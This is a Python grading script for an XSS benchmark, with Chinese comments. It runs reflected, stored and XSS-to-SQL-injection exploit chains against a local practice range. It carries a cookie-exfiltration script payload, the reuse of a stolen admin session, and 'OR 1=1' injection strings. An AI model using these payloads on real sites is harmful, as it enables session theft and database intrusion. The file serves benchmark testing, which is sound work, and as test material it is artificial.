#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XSS 实战基准集判定器（Python 侧）

纪律：与 judge_web.py 同口径——起真实靶场（live_target/xss_range.py），
复刻完整利用链，把拿到的 flag 与 xss_benchmark.json 的 flag_sha256 逐一比对。
flag 只有在「回显未转义 + 外带链成立」时才会经管理员 bot 泄漏，杜绝关键词猜中。

三个场景（真题对照见 docs/static_benchmark_gap_analysis_20261023.md §三）：
  1. xss_reflected —— 搜索框反射型：payload 经 /search?q= 回显，bot 执行外带
  2. xss_stored    —— 留言板存储型：payload 落库，bot 浏览留言时执行外带
  3. xss_to_sqli   —— XSS 偷管理端会话 → 带会话打 /admin/panel 的 SQLi

浏览器执行是**最小 JS 子集模拟**（见 xss_range.py 的诚实边界），不是真实浏览器。

用法：  python judge_xss.py
"""
import hashlib
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from http.client import HTTPConnection

HERE = os.path.dirname(os.path.abspath(__file__))
RANGE_PY = os.path.join(HERE, "live_target", "xss_range.py")
BENCH = os.environ.get("XSS_BENCH", os.path.join(HERE, "xss_benchmark.json"))
PORT = int(os.environ.get("XSS_PORT", "18096"))

FLAG_RE = re.compile(r"(?:flag|FLAG|picoCTF|ctf)\{[^}]{3,80}\}", re.I)

# 外带 payload：读 document.cookie 并打到攻击者监听器
PAYLOAD = "<script>fetch('/collect?c='+encodeURIComponent(document.cookie))</script>"


def sh(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()


def scan_flags(text: str):
    return FLAG_RE.findall(text or "")


def fetch(url: str, data: bytes = None, ctype: str = None, timeout: float = 5.0):
    """返回 (status, body_text, headers)。失败返回 (0, '', {})。"""
    try:
        req = urllib.request.Request(url, data=data, method="POST" if data is not None else "GET")
        req.add_header("User-Agent", "SecAutoMind-XSSJudge/1.0")
        if ctype:
            req.add_header("Content-Type", ctype)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "ignore"), dict(r.headers)
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("utf-8", "ignore")
        except Exception:
            body = ""
        return e.code, body, dict(e.headers or {})
    except Exception:
        return 0, "", {}


def trigger_bot(base: str, target: str, scene: str):
    """让管理员 bot 带 Cookie 访问 target（scene 决定 Cookie 里放什么）。"""
    url = base + "/admin/visit?" + urllib.parse.urlencode({"url": target, "scene": scene})
    return fetch(url)


def latest(base: str) -> str:
    """读取攻击者监听器收到的最新外带数据（URL 解码后返回）。"""
    st, body, _ = fetch(base + "/collect/latest")
    if not st:
        return ""
    try:
        raw = json.loads(body).get("data", "")
    except Exception:
        return ""
    return urllib.parse.unquote(raw)


def exploit(base: str):
    """复刻完整 XSS 利用链，返回 {sha256(flag): (scene, flag)}。"""
    found = {}

    # 1. 反射型：payload 经搜索框回显，bot 执行外带
    trigger_bot(base, "/search?q=" + urllib.parse.quote(PAYLOAD), "xss_reflected")
    for f in scan_flags(latest(base)):
        found[sh(f)] = ("xss_reflected", f)

    # 2. 存储型：payload 落进留言板，bot 浏览时执行外带
    form = urllib.parse.urlencode({"name": "attacker", "msg": PAYLOAD}).encode()
    fetch(base + "/guestbook", data=form, ctype="application/x-www-form-urlencoded")
    trigger_bot(base, "/guestbook", "xss_stored")
    for f in scan_flags(latest(base)):
        found[sh(f)] = ("xss_stored", f)

    # 3. XSS → SQLi：先偷管理端会话，再带会话打管理面板
    trigger_bot(base, "/search?q=" + urllib.parse.quote(PAYLOAD), "xss_to_sqli")
    data = latest(base)
    m = re.search(r"admin_session=([^;]+)", data)
    if m:
        sess = m.group(1)
        for pl in ["1' OR '1'='1", "1 OR 1=1--", "1' OR 1=1#"]:
            st, body, _ = fetch(base + "/admin/panel?" + urllib.parse.urlencode(
                {"session": sess, "id": pl}))
            if st:
                for f in scan_flags(body):
                    found[sh(f)] = ("xss_to_sqli", f)
    return found


def wait_ready(port, timeout=10.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            c = HTTPConnection("127.0.0.1", port, timeout=1)
            c.request("GET", "/")
            c.getresponse().read()
            c.close()
            return True
        except Exception:
            time.sleep(0.1)
    return False


def main():
    bench = json.load(open(BENCH, encoding="utf-8"))["problems"]
    proc = subprocess.Popen([sys.executable, RANGE_PY, str(PORT)],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        if not wait_ready(PORT):
            print("靶场未就绪")
            return 1
        found = exploit("http://127.0.0.1:%d" % PORT)
        hits = 0
        for scene, p in bench.items():
            if p["flag_sha256"] in found:
                hits += 1
                print("✅ HIT  %-14s -> %s" % (scene, found[p["flag_sha256"]][1]))
            else:
                print("❌ MISS %-14s" % scene)
        total = len(bench)
        print("=== [Python] XSS 实战命中率: %d/%d = %.1f%% ===" % (hits, total, 100 * hits / total))
        return 0 if hits == total else 1
    finally:
        proc.kill()


if __name__ == "__main__":
    sys.exit(main())
